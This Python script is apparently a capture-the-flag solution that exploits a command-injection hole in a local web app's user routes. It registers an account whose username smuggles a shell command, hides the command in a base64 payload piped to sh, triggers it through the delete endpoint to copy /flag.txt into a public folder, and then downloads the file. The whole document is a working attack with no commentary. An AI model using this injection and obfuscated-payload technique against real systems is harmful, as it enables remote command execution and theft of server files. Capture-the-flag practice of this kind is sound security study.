#!/usr/bin/env python3
import base64
import requests

BASE_URL = "http://localhost:8000"
PASSWORD = "pass"

def create_account(username: str):
    session = requests.Session()

    for route in ["/user/register", "/user/login"]:
        resp = session.post(
            BASE_URL + route, json={
                "username": username,
                "password": PASSWORD
            }
        )
        if not resp.ok:
            raise Exception(f"Failed to {route}: {resp.text}")
    
    return session

def execute(command: str):
    username = f"foo';{command} #"
    session = create_account(username)
    session.delete(BASE_URL + "/user/delete", json={})

print("=> Executing command")
command = base64.b64encode(b"cat /flag.txt > public/f").decode()
command = f"echo '{command}'|base64 -d|sh"
execute(command)

print("=> Retrieving flag")
resp = requests.get(BASE_URL + "/public/f")
print(resp.text)